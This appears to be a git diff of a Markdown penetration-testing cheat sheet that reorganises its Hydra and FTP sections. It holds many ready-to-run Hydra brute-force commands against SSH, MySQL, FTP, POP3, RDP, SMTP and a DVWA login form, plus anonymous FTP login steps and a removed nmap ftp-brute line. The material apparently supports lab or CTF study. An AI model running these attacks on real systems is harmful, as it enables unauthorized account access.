@@ -16,11 +16,12 @@
 - [2. Endpoints Enum](#endpoint)
 - [3. Subdomain Enum](#subdomain)
 - [4. Hydra](#hydra)
+- [5.FTP](#ftp)
 - [6. Mysql](#mysql)
 - [7. Cewl](#cewl) - It is use to create a worldlist using website link
 - [8. SSH](#ssh)
 
-- [10.FTP](#ftp)
+
 - [11. shell upgreade](#shell)
 - [12. Post-Exploit Enumeration](#post)
 - [13. Password Cracking](/hash_cracking.md)
@@ -73,37 +74,32 @@
 
 # 4. Hydra <a name="hydra"></a>
 
+- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh`
+- `hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh -t 50`
+- `hydra -l root -P /usr/share/wordlists/rockyou.txt 127.0.0.1 mysql`
+- `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp`
+- `hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp`
+- `hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3`
+- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`
+- `hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V`
 - `hydra -C <combinations.txt> <ip> <service>`
-- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
-- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
-- ```hydra -l root -P /usr/share/wordlists/rockyou.txt $ip mysql```
-```
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
-```
-```
-hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
-```
-### Hydra POP3 Brute Force
-```
-hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
-```
-### Hydra RDP
-```
-hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
-```
-### Hydra SMTP Brute Force
-```
-hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
-```
-### Hydra SSH Brute Force
-```
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
-```
-### Brute Forcing a Website Login
+
+##### Website Login
 - Login page 
 - http://127.0.0.0/DVWA/vulnerabilities/brute/index.php
-
 - `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`
+
+
+# 5. FTP <a name="ftp"></a>
+- `ftp  192.168.112.50 21`
+- __user:anonymous__
+- __pass:__
+- to upload a file use ```put <filename>```
+- to download a file use ```get <filename>```
+- `hydra -L /unix_users.txt -P /unix_passwords.txt 192.168.112.50 ftp`
+
+
+
 
 
 
@@ -131,21 +127,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
 
 
 
-# 10. FTP <a name="ftp"></a>
 
-- `ftp  192.168.112.50 21`
-```
-hydra -L /unix_users.txt -P /unix_passwords.txt 192.168.112.50 ftp
-```
-```
-nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
-```
-- ftp <ip>
-  - user:anonymous
-  - pass:
-  - 230 Login successful
-  - to upload a file use ```put <filename>```
-  - to download a file use ```get <filename>```
 
 
 
